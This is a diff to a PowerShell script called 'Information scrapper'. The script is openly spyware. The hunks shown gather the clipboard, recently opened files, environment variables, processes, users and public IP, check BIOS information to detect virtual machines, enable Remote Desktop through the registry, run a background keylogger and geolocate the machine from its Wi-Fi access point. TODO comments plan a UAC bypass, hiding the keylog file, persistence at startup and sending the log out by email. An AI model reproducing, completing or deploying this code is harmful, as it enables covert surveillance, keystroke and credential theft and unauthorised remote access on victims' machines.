@@ -29,14 +29,14 @@ Unblock-File c:\downloads\file.zip
 .TODO
 ###check if user is in administrator group, if true and script inst run as admin try UAC bypass
 https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-local-admins-group-on-a-remote-server
-
+### TODO add startup  script
 ### hide keylogger produced file and change the name
 
 #>
 
 ### Add information to results
 function Main(){
-$results = "RESULTS `n`n"
+$results = "RESULTS `n"
 initialize
 $results = nonAdministrativeScrapperFunctions
 ### Runs Key logger (does not require admin privs)
@@ -106,17 +106,17 @@ $host.ui.RawUI.WindowTitle = "Information scrapper"
 
 function nonAdministrativeScrapperFunctions(){
 $results = "Start of non Administrative Scrapper Functions`n"
-$results += "`n`n"
+$results += "`n"
 ### Get current date
 $results += "`nCurrent Date `n"
 $results += [System.DateTime]::Now
-$results += "`n`n"
+$results += "`n"
 # or
 # Get-Date
 ### Get execution policy to see if running a script is possible
 $results += "`nExecution policy`n"
 $results += Get-ExecutionPolicy 
-$results += "`n`n"
+$results += "`n"
 
 <#
 NOT NEEDED, systeminfo GATHERS THIS INFORMATION
@@ -129,47 +129,50 @@ NOT NEEDED, systeminfo GATHERS THIS INFORMATION
 ### Detailed system info
 $results += "`nDetailed system info `n"
 $results += systeminfo | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+$results += "`n"
 
 ### Gets public ip
 $results += "`nPublic IP `n"
 $results += Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
-$results += "`n`n"
+$results += "`n"
 
 ### Gets active tcp connections
 $results += "`nActive TCP connections `n"
 $results += Get-NetTCPConnection | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+$results += "`n"
 
 ### Gets contents of clipboard
 $results += "`nClipboard content`n"
 $results += Get-Clipboard
-$results += "`n`n"
+$results += "`n"
 
 ### Gets information of installation settings
 $results += "`nInstallation settings info `n"
-$results += Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+$results += Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion | Out-String
+$results += "`n"
 
 ### Detects if powershell is run as administrator
 $results += "`nIs powershell run as admin? `n"
 $results += [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-$results += "`n`n"
+$results += "`n"
 
 ### Lists recently opened files
 $results += "`nRecently opened files `n"
 $results += dir $HOME"\AppData\Roaming\Microsoft\Windows\Recent\" | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+$results += "`n"
 
 ### Gets BIOS info (can be used to find out if a machine runs in a virtual environment)
 $results += "`nBIOS info `n"
 $results += Get-WmiObject win32_bios | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+$results += "`n"
 
 ### Gets  name, status, SID, Lastlogon of all local users
 $results += "`nLocal users info `n"
-$results += Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+### Powershell v2 incompatible!!!
+#$results += Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-Table -HideTableHeaders | Out-String 
+### PSv2 alternative
+$results += net user $env:UserName
+$results += "`n"
 
 ### Checks if computer is in domain
 $results += "`nIs computer in a domain?`n"
@@ -178,12 +181,12 @@ if ((gwmi win32_computersystem).partofdomain -eq $true) {
 } else {
     $results += "Ooops, workgroup!"
 }
-$results += "`n`n"
+$results += "`n"
 
 ### Gets all running processes with details
 $results += "`nAll running processes`n"
 $results +=  Get-Process | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+$results += "`n"
 
 ### Slow but more detailed alternative (not needed if results will be stored in variable)
 # Get-Process | format-list *
@@ -191,7 +194,7 @@ $results += "`n`n"
 ### Gets all environment variables
 $results += "`nEnvironment variables`n"
 $results +=  Get-ChildItem env: | Format-Table -HideTableHeaders | Out-String
-$results += "`n`n"
+$results += "`n"
 
 $results
 }
@@ -220,6 +223,7 @@ Set-ItemProperty $regKey fDenyTSConnections 0
 ### Function that creates a power shell file 
 ### with the key loggers source in it and runs it in background
 ### IF log file already exists, it appends results
+### TODO add a proces that periodicaly sends the updated log file through email
 function keyLogger(){
 $scriptForKeyloggerAsString = 'Add-Type -TypeDefinition @"
 using System;
@@ -301,7 +305,7 @@ $job = start-Job -scriptblock $scriptBlock
 # TODO catch when pc has 2 or more w-nic
 # There is a daily query limit ~5 requests
 function findGeoLocation(){
-	
+	Try{
 	# Gets current AP 
 	$strDump = netsh wlan show interfaces
 	# PARSING....
@@ -339,7 +343,10 @@ function findGeoLocation(){
 	$response = Invoke-RestMethod -Uri $uri -Headers $Headers
 	$response
 	$response.results
-		
+		}
+		Catch{
+		return "Geolocation failed. Pc is probably not connected to a WAP..."
+		}
 }
 
 
